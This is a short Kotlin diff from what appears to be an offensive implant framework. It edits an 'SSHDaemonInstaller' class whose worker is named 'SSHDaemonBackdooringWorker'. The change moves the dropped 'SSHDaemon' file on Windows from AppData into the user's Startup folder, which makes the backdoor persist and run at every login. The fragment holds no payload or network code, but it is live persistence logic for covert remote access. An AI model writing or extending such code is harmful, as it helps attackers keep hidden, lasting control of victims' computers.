@@ -23,7 +23,7 @@ class SSHDaemonInstaller(
     override val name = "SSHDaemonBackdooringWorker"
     override val file = object : SystemFileURI() {
         override val linux = nullPath
-        override val windows = appData / "SSHDaemon"
+        override val windows = appData / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / "SSHDaemon"
         override val xnu: Path
             get() = TODO("Not yet implemented")
 
